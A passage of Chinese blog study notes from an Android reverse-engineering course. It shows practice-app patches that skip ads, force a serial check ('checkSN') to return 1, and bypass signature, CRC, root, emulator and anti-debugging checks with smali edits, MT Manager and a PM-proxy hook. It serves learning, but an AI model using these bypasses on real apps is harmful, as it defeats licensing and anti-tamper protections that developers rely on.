<p>在.so文件加载时就会被运行，比JNI_OnLoad早</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240117150857630.png" alt="image-20240117150857630"></p>
<p>对应函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240117151012814.png" alt="image-20240117151012814"></p>
<p>跳转函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240117151307128.png" alt="image-20240117151307128"></p>
<p>即fget按行读取，总共6次遍历，获取<code>/proc/xx/status</code>的第六行，即<code>TracePid</code>，查看里面的数据是否大于0，大于0则代表程序正在被调试，即退出。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240117151614732.png" alt="image-20240117151614732"></p>
<p>可以刷机改内核，使得TracerPid永远为0</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-733981-1-1.html" >逆向修改内核，绕过TracerPID反调试 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
<li><p>JNI_OnLoad函数</p>
<p>在执行<code>System.loadLibrary(&quot;xxx.so&quot;)</code>时被调用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240117152056226.png" alt="image-20240117152056226"></p>
<p>进入SearchObjProcess函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240117152231674.png" alt="image-20240117152231674"></p>
<p>查看是否有这些进程，有就退出</p>
<p>可以将android_server修改为其他名称</p>
</li>
</ul>

        <h2 id="11-动态调试init-array"   >
          <a href="#11-动态调试init-array" class="heading-link"><i class="fas fa-link"></i></a><a href="#11-动态调试init-array" class="headerlink" title="11 动态调试init_array"></a>11 动态调试init_array</h2>
      <p>没成功，寄</p>
<p>不过调试最开始的需要在手机中这样运行才行，在Frida中好像也讲过</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -D -n demo2.jni.com.myapplication/.MainActivity</span><br></pre></td></tr></table></div></figure>




        <h1 id="安卓逆向这档事"   >
          <a href="#安卓逆向这档事" class="heading-link"><i class="fas fa-link"></i></a><a href="#安卓逆向这档事" class="headerlink" title="安卓逆向这档事"></a>安卓逆向这档事</h1>
      
        <h2 id="课程二、初识APK文件结构、双开、汉化、基础修改"   >
          <a href="#课程二、初识APK文件结构、双开、汉化、基础修改" class="heading-link"><i class="fas fa-link"></i></a><a href="#课程二、初识APK文件结构、双开、汉化、基础修改" class="headerlink" title="课程二、初识APK文件结构、双开、汉化、基础修改"></a>课程二、初识APK文件结构、双开、汉化、基础修改</h2>
      <p>参考基础知识中的汉化知识块。</p>

        <h3 id="汉化未知语言"   >
          <a href="#汉化未知语言" class="heading-link"><i class="fas fa-link"></i></a><a href="#汉化未知语言" class="headerlink" title="汉化未知语言"></a>汉化未知语言</h3>
      <p>同时<code>MT</code>管理器还有一键翻译的功能，下载对应的翻译插件即可。</p>

        <h3 id="课后作业"   >
          <a href="#课后作业" class="heading-link"><i class="fas fa-link"></i></a><a href="#课后作业" class="headerlink" title="课后作业"></a>课后作业</h3>
      
        <h4 id="汉化"   >
          <a href="#汉化" class="heading-link"><i class="fas fa-link"></i></a><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h4>
      <p>可以先进行通用搜索</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125092914594.png" alt="image-20240125092914594"></p>
<p>查找到resources.arsc，这个也是汉化大头</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125093020630.png" alt="image-20240125093020630"></p>
<p>然后可以直接点击翻译模式</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125093006776.png" alt="image-20240125093006776"></p>
<p>点击[DEFAULT]</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125093112008.png" alt="image-20240125093112008"></p>
<p>找到对应字符串即可修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125093155655.png" alt="image-20240125093155655"></p>

        <h4 id="应用双开"   >
          <a href="#应用双开" class="heading-link"><i class="fas fa-link"></i></a><a href="#应用双开" class="headerlink" title="应用双开"></a>应用双开</h4>
      <p>MT管理器就可以</p>

        <h4 id="替换图片"   >
          <a href="#替换图片" class="heading-link"><i class="fas fa-link"></i></a><a href="#替换图片" class="headerlink" title="替换图片"></a>替换图片</h4>
      <p>通过图片资源ID，在XML搜索中查找到的XML，一般是用来定义图片布局大小和加载路径的，可以通过修改这个布局达到去除图片和替换图片的目的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125100604466.png" alt="image-20240125100604466"></p>
<p>MT不显示资源ID时，可以点击如下设置，取消ID转名称，这样好查找</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125100647160.png" alt="image-20240125100647160"></p>
<p>然后找到app:srcCompat即可，复制这个7f0d000b资源ID</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125100728804.png" alt="image-20240125100728804"></p>
<p>随后到resources.arsc中的编辑器</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125101214945.png" alt="image-20240125101214945"></p>
<p>通过ID定位资源</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125101229576.png" alt="image-20240125101229576"></p>
<p>即可查看到对应的资源路径，然后替换图片即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125102954025.png" alt="image-20240125102954025"></p>

        <h2 id="课程三、初识smali、VIP终结者"   >
          <a href="#课程三、初识smali、VIP终结者" class="heading-link"><i class="fas fa-link"></i></a><a href="#课程三、初识smali、VIP终结者" class="headerlink" title="课程三、初识smali、VIP终结者"></a>课程三、初识smali、VIP终结者</h2>
      <p>有些字符串是一个资源，不是写在代码里面，使用开发者助手查找时通常为<code>0x7xxxxx</code>这样的类型，那么就在MT管理器里面反编译<code>classes.dex</code>用整型的16进制进行搜索</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230920173517991.png" alt="image-20230920173517991"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230920173719749.png" alt="image-20230920173719749"></p>
<p>找到修改即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230920173732547.png" alt="image-20230920173732547"></p>

        <h2 id="课程四、恭喜获得广告-amp-弹窗静默卡"   >
          <a href="#课程四、恭喜获得广告-amp-弹窗静默卡" class="heading-link"><i class="fas fa-link"></i></a><a href="#课程四、恭喜获得广告-amp-弹窗静默卡" class="headerlink" title="课程四、恭喜获得广告&amp;弹窗静默卡"></a>课程四、恭喜获得广告&amp;弹窗静默卡</h2>
      
        <h3 id="获取Activity记录"   >
          <a href="#获取Activity记录" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取Activity记录" class="headerlink" title="获取Activity记录"></a>获取Activity记录</h3>
      <p>可以用<code>MT</code>管理器来获取一个<code>APK</code>启动的<code>Activity</code>的记录，在<code>MT</code>主界面左上角点击三横线图标展开，启动<code>Activity</code>记录服务</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921085806851.png" alt="image-20230921085806851"></p>
<p>然后打开对应的<code>APK</code>，切换回<code>MT</code>管理器即可查看到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921090029390.png" alt="image-20230921090029390"></p>

        <h3 id="去除广告"   >
          <a href="#去除广告" class="heading-link"><i class="fas fa-link"></i></a><a href="#去除广告" class="headerlink" title="去除广告"></a>去除广告</h3>
      <p>对于广告来说，去除的方法通常有如下几种</p>
<ul>
<li><p>第一种：修改加载时间，把广告的显示时间修改为0秒即可</p>
<p>获取广告<code>Activity</code>的名称，反编译<code>classes.dex</code>进行类名搜索</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921091645061.png" alt="image-20230921091645061"></p>
<p>然后找到类的<code>smali</code>路径进行搜索</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921100539630.png" alt="image-20230921100539630"></p>
<p>再进行代码搜索</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921100626230.png" alt="image-20230921100626230"></p>
<p>进入到如下的<code>AdActivity</code>类中代码进行分析</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921104708223.png" alt="image-20230921104708223"></p>
<p>即在主函数<code>onCreate</code>中调用了广告代码<code>loadAd</code>，随后启动广告，持续<code>3000ms</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(<span class="number">2131427362</span>);</span><br><span class="line">        loadAd();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">loadAd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.timeoutHandler.removeMessages(MSG_AD_TIMEOUT);</span><br><span class="line">        <span class="keyword">this</span>.timeoutHandler.sendEmptyMessageDelayed(MSG_AD_TIMEOUT, <span class="number">3000</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>

<p>那么将<code>3000ms</code>调成<code>0ms</code>即可跳过广告。</p>
</li>
<li><p>第二种：修改<code>Activity</code>执行顺序，跳过广告的<code>Activity</code></p>
<p>这个最好还是不用，只需要在<code>AndroidManifest.xml</code>中将主<code>Activity</code>修改为自己需要的就行，比如这里就直接将主<code>Activity</code>修改为第三关的<code>Activity</code>。但是很多的<code>Activity</code>都会加载资源，直接跳转到后面的<code>Acitivity</code>容易导致应用<code>GG</code>。</p>
</li>
<li><p>第三种：修改切换<code>Activity</code>的代码</p>
<p>即找到调用<code>Activity</code>的代码，将调用广告<code>Activity</code>处的代码直接修改为调用第三关的<code>Acitvity</code></p>
<p>首先还是查找一下广告<code>Activity</code>，然后需要排查一下，本身的<code>Activity</code>去除一下，查找调用到广告的<code>Activity</code>，排查找到<code>com.zj.wuaipojie.ui.Adapter</code>中有调用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921110629477.png" alt="image-20230921110629477"></p>
<p>进入查看定位关键代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> m0onCreateViewHolder$lambda-<span class="number">0</span>(ViewHolder viewHolder, View view) &#123;</span><br><span class="line">        <span class="keyword">int</span> adapterPosition = viewHolder.getAdapterPosition();</span><br><span class="line">        Intent intent;</span><br><span class="line">        <span class="keyword">if</span> (adapterPosition == <span class="number">0</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> Intent();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeFirst.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">1</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> Intent();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeSecond.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">2</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> Intent();</span><br><span class="line">            intent.setClass(view.getContext(), AdActivity.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">3</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> Intent();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeFourth.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">4</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> Intent();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeFifth.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到这里进入第三关时会先加载广告<code>Acitivity</code>，那么这里把进入第三关的代码修改为直接进入第三关的<code>Activity</code>即可，在<code>smali</code>代码中进行修改，将<code>Lcom/zj/wuaipojie/ui/AdActivity</code>修改为<code>Lcom/zj/wuaipojie/ui/ChallengeSecond</code>即可。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921111702702.png" alt="image-20230921111702702"></p>
<p>然后保存重新安装即可。</p>
</li>
</ul>

        <h3 id="弹窗修改"   >
          <a href="#弹窗修改" class="heading-link"><i class="fas fa-link"></i></a><a href="#弹窗修改" class="headerlink" title="弹窗修改"></a>弹窗修改</h3>
      <p>最主要的是定位弹窗在哪。</p>
<p>针对更新弹窗而言，一般都是在代码逻辑里判断新版本和当前版本是否版本号一致，那么可以直接修改<code>XML</code>中的<code>versiocode</code>为最新版本即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921112413531.png" alt="image-20230921112413531"></p>
<p>还有的可以用算法助手工具进行直接<code>Hook</code>，有弹窗定位，关键词屏蔽功能等，这样就可以把某些返回键禁止的弹窗给<code>hook</code>了。</p>
<ul>
<li><p>修改<code>dex</code>代码</p>
<p>使用开发助手的日志功能对弹窗进行定位，找到对应的代码，注释掉<code>show</code>方法修改即可。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921142007647.png" alt="image-20230921142007647"></p>
</li>
<li><p>抓包修改响应体</p>
<p>使用开发助手-&gt;布局查看功能找到横幅广告图片的view Id在哪，修改高度宽度即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921141310674.png" alt="image-20230921141310674"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921142647394.png" alt="image-20230921142647394"></p>
<p>随后进行<code>XML</code>搜索即可，修改长宽。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230921165853598.png" alt="image-20230921165853598"></p>
<p>另外也可以加入一段代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:visibility=&quot;gone&quot;</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="课后作业-1"   >
          <a href="#课后作业-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#课后作业-1" class="headerlink" title="课后作业"></a>课后作业</h3>
      <p>使用算法助手的弹窗定位功能，定位到关键函数，这个函数是被混淆过的函数。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125145728792.png" alt="image-20240125145728792"></p>
<p>复制这个方法名称，在MT中搜索</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125145840175.png" alt="image-20240125145840175"></p>
<p>定位之后，里面有三个函数都会有弹窗调用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125150024308.png" alt="image-20240125150024308"></p>
<p>都把那个show给注释掉即可，或者查找调用点，在调用点处注释即可</p>
<p>或者使用关键字”弹窗”来定位代码也是一样的。</p>

        <h2 id="课程五、1000-7-？-amp-动态调试-amp-Log插桩"   >
          <a href="#课程五、1000-7-？-amp-动态调试-amp-Log插桩" class="heading-link"><i class="fas fa-link"></i></a><a href="#课程五、1000-7-？-amp-动态调试-amp-Log插桩" class="headerlink" title="课程五、1000-7=？&amp;动态调试&amp;Log插桩"></a>课程五、1000-7=？&amp;动态调试&amp;Log插桩</h2>
      
        <h3 id="动态调试"   >
          <a href="#动态调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3>
      <ul>
<li><p>首先需要将<code>AndroidManifest.xml</code>中加入调试权限</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928101038713.png" alt="image-20230928101038713"></p>
<p>然后重新安装，再把安装包放入<code>JEB</code>进行分析，在需要下断点的地方按<code>ctrl + b</code>即可下断点。</p>
</li>
<li><p>随后使用<code>adb</code>连上手机，输入如下命令开启调试功能</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n com.zj.wuaipojie/.ui.MainActivity</span><br></pre></td></tr></table></div></figure>

<p>命令解析为</p>
<p>adb shell am start -D -n<br>adb shell am start -D -n 包名/类名<br>am start -n 表示启动一个activity<br>am start -D 表示将应用设置为可调试模式</p>
<p>这个类名为主类名才行。</p>
<p>输入命令后，在手机中会显示如下弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928101325955.png" alt="image-20230928101325955"></p>
</li>
<li><p>之后点击<code>JEB</code>上的调试即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928101341269.png" alt="image-20230928101341269"></p>
</li>
</ul>
<p>其他的调试方法有点麻烦，不研究了。</p>

        <h3 id="Log插桩"   >
          <a href="#Log插桩" class="heading-link"><i class="fas fa-link"></i></a><a href="#Log插桩" class="headerlink" title="Log插桩"></a>Log插桩</h3>
      <ul>
<li>将插桩的<code>.dex</code>文件添加到<code>apk</code>中，长按出现添加按钮</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928102311161.png" alt="image-20230928102311161"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928102327640.png" alt="image-20230928102327640"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928102342731.png" alt="image-20230928102342731"></p>
<ul>
<li><p>随后在需要获取的寄存器值的位置，加入如下代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;对应寄存器&#125;, Lcom/mtools/LogUtils;-&gt;v(Ljava/lang/Object;)V</span><br></pre></td></tr></table></div></figure>

<p>如下图所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230928103457975.png" alt="image-20230928103457975"></p>
<p>获取<code>v0</code>的值</p>
</li>
</ul>

        <h3 id="课后作业-2"   >
          <a href="#课后作业-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#课后作业-2" class="headerlink" title="课后作业"></a>课后作业</h3>
      <p>算法助手启用onClick监听，分析到是在MainActivity中，或者通过字符串搜索定位资源ID，然后定位资源ID调用的代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125153055436.png" alt="image-20240125153055436"></p>
<p>那么在该类中查找一下onClick，可以找到对应的函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125153141447.png" alt="image-20240125153141447"></p>
<p>直接让checkSN永远返回1即可，在MT管理器中查找修改，添加如下即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125154047803.png" alt="image-20240125154047803"></p>
<p>动态调试的话，也还是有点麻烦，拉到把。</p>

        <h2 id="课程六、校验的N次方-签名校验对抗、PM代-过-滤-理、IO重定向"   >
          <a href="#课程六、校验的N次方-签名校验对抗、PM代-过-滤-理、IO重定向" class="heading-link"><i class="fas fa-link"></i></a><a href="#课程六、校验的N次方-签名校验对抗、PM代-过-滤-理、IO重定向" class="headerlink" title="课程六、校验的N次方-签名校验对抗、PM代{过}{滤}理、IO重定向"></a>课程六、校验的N次方-签名校验对抗、PM代{过}{滤}理、IO重定向</h2>
      
        <h3 id="检测校验"   >
          <a href="#检测校验" class="heading-link"><i class="fas fa-link"></i></a><a href="#检测校验" class="headerlink" title="检测校验"></a>检测校验</h3>
      
        <h4 id="签名校验"   >
          <a href="#签名校验" class="heading-link"><i class="fas fa-link"></i></a><a href="#签名校验" class="headerlink" title="签名校验"></a>签名校验</h4>
      <p>通常就是校验包的hash值是否被修改</p>
<ul>
<li><p>普通签名校验</p>
<p>系统将应用的签名信息封装在 PackageInfo 中，调用 PackageManager 的 getPackageInfo(String packageName, int flags) 即可获取指定包名的签名信息</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">SignCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String trueSignMD5 = <span class="string">&quot;d0add9987c7c84aeb7198c3ff26ca152&quot;</span>;</span><br><span class="line">    String nowSignMD5 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 得到签名的MD5</span></span><br><span class="line">        PackageInfo packageInfo = getPackageManager().getPackageInfo(getPackageName(),PackageManager.GET_SIGNATURES);</span><br><span class="line">        Signature[] signs = packageInfo.signatures;</span><br><span class="line">        String signBase64 = Base64Util.encodeToString(signs[<span class="number">0</span>].toByteArray());</span><br><span class="line">        nowSignMD5 = MD5Utils.MD5(signBase64);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> trueSignMD5.equals(nowSignMD5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这种签名一般在签名校验的部分，注释掉签名校验错误的代码，或者将那个<code>trueSignMD5</code>签名修改为实际签名即可。</p>
</li>
<li><p>校验Application</p>
</li>
<li><p>CRC校验</p>
<p>获取dex的crc的值，即当修改了dex，它的值必定会发生改变</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ZipEntry entry = new ZipFile(getPackageCodePath()).getEntry(&quot;classes.dex&quot;);</span><br><span class="line">Log.e(&quot;zj2595&quot;, &quot;dexCrc:&quot; + entry.getCrc());</span><br></pre></td></tr></table></div></figure></li>
<li><p>hash校验</p>
<p>获取整个APK的hash值，然后进行比对</p>
</li>
</ul>

        <h4 id="root检测"   >
          <a href="#root检测" class="heading-link"><i class="fas fa-link"></i></a><a href="#root检测" class="headerlink" title="root检测"></a>root检测</h4>
      
        <h5 id="检测方式"   >
          <a href="#检测方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#检测方式" class="headerlink" title="检测方式"></a>检测方式</h5>
      <ul>
<li><p>检查设备的 <code>build tags</code> 是否包含 <code>test-keys</code>。这通常是用于测试的设备，因此如果检测到这个标记，则可以认为设备已被 root。</p>
</li>
<li><p>检查设备是否存在一些特定的文件，这些文件通常被用于执行 root 操作。如果检测到这些文件，则可以认为设备已被 root。比如如下一些常见的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/system/app/Superuser.apk&quot;, &quot;/sbin/su&quot;, &quot;/system/bin/su&quot;, &quot;/system/xbin/su&quot;, &quot;/data/local/xbin/su&quot;, &quot;/data/local/bin/su&quot;, &quot;/system/sd/xbin/su&quot;,&quot;/system/bin/failsafe/su&quot;, &quot;/data/local/su&quot;, &quot;/su/bin/su</span><br></pre></td></tr></table></div></figure></li>
<li><p>执行which su，来查看是否有输出</p>
</li>
</ul>

        <h5 id="对抗手段"   >
          <a href="#对抗手段" class="heading-link"><i class="fas fa-link"></i></a><a href="#对抗手段" class="headerlink" title="对抗手段"></a>对抗手段</h5>
      <ul>
<li>IO重定向使文件不可读</li>
<li>修改Android源码，去除常见指纹</li>
<li>算法助手等Hook</li>
</ul>

        <h4 id="模拟器检测"   >
          <a href="#模拟器检测" class="heading-link"><i class="fas fa-link"></i></a><a href="#模拟器检测" class="headerlink" title="模拟器检测"></a>模拟器检测</h4>
      
        <h5 id="检测方式-1"   >
          <a href="#检测方式-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#检测方式-1" class="headerlink" title="检测方式"></a>检测方式</h5>
      <p>通过检测系统的 <code>Build</code> 对象来判断当前设备是否为模拟器。具体方法是检测 <code>Build.FINGERPRINT</code> 属性是否包含字符串 <code>&quot;generic&quot;</code>。</p>

        <h5 id="对抗手段-1"   >
          <a href="#对抗手段-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#对抗手段-1" class="headerlink" title="对抗手段"></a>对抗手段</h5>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ionized-bag-d70.notion.site/04dbaf39091f42519b14decd2a87fde7" >模拟器检测对抗 (notion.site)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="签名定位"   >
          <a href="#签名定位" class="heading-link"><i class="fas fa-link"></i></a><a href="#签名定位" class="headerlink" title="签名定位"></a>签名定位</h3>
      <ul>
<li>一般通过算法助手定位闪退的日志</li>
</ul>

        <h3 id="签名校验对抗"   >
          <a href="#签名校验对抗" class="heading-link"><i class="fas fa-link"></i></a><a href="#签名校验对抗" class="headerlink" title="签名校验对抗"></a>签名校验对抗</h3>
      <ul>
<li><p>一键过签名工具：</p>
<p>MT、NP、ARMPro、CNFIX、Modex</p>
</li>
<li><p>PM代理</p>
<p>来源于：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/fourbrother/HookPmsSignature" >https://github.com/fourbrother/HookPmsSignature</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>使用PM手撕没成功，不是很会</p>
<p>smali.jar：从smali转为dex</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar smali.jar assemble -o 输出目录 输入目录</span><br></pre></td></tr></table></div></figure>

<p>baksmali.jar：从dex转为smali</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar baksmali.jar d classes.dex</span><br></pre></td></tr></table></div></figure></li>
<li><p>IO重定向</p>
</li>
<li><p>不签名安装</p>
</li>
</ul>
<p>签名对抗还是手撕签名好一点，可以用一些<code>hook</code>助手来查找签名</p>
<p>PM代理有点过时，但是对于某些应用签名还是可以搞定的。</p>

        <h3 id="普通签名"   >
          <a href="#普通签名" class="heading-link"><i class="fas fa-link"></i></a><a href="#普通签名" class="headerlink" title="普通签名"></a>普通签名</h3>
      <p>可以用算法助手进行拦截</p>

        <h3 id="PM代理"   >
          <a href="#PM代理" class="heading-link"><i class="fas fa-link"></i></a><a href="#PM代理" class="headerlink" title="PM代理"></a>PM代理</h3>
      <ul>
<li><p>首先PmsHookBinderInvocationHandler.smali和ServiceManagerWraper.smali</p>
</li>
<li><p>修改ServiceManagerWraper.smali中的内容，将签名信息和包名修改为指定安装包信息</p>
<p>签名信息为如下原始数据内容</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125165748164.png" alt="image-20240125165748164"></p>
</li>
<li><p>然后将两个smali文件放到一个文件夹，使用命令</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar smali.jar assemble -o HookPMS.dex .\zhengji\Hook\</span><br></pre></td></tr></table></div></figure>

<p>生成得到HookPMS.dex</p>
</li>
<li><p>随后将HookPMS.dex导入安装包，重新命名classes2.dex，重新打包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125170224796.png" alt="image-20240125170224796"></p>
</li>
<li><p>随后搜索attachBaseContext方法，在MainApplication中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125170348573.png" alt="image-20240125170348573"></p>
<p>加入如下代码</p>
